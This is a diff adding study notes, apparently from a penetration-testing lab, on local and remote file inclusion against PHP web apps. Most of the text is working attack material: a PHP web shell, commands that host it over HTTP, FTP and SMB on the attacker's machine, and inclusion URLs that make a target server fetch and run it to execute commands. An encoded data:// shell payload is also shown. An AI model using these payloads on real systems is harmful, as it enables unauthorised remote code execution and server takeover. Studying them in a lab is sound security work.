@@ -208,7 +208,53 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 http://94.237.62.195:36489/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt
 
+# Local vs. Remote File Inclusion
 
+Function					Read Content	Execute	Remote URL
 
+PHP			
+include()/include_once()	✅				✅		✅
+file_get_contents()			✅				❌		✅
 
+Java			
+import						✅				✅		✅
+
+.NET			
+@Html.RemotePartial()		✅				❌		✅
+include						✅				✅		✅
+
+# Verify RFI
+
+http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+
+# Remote Code Execution with RFI
+
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# HTTP
+Now, we can start a server on our machine with a basic python server with the following command, as follows:
+
+sudo python3 -m http.server <LISTENING_PORT>
+
+http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+
+# FTP
+As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's pyftpdlib, as follows:
+
+sudo python -m pyftpdlib -p 21
+
+http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+
+# Authenticated
+
+curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
   
+# SMB
+# If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers),
+# then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion.
+# This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
+# We can spin up an SMB server using Impacket's smbserver.py, which allows anonymous authentication by default, as follows:
+
+impacket-smbserver -smb2support share $(pwd)
+
+http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
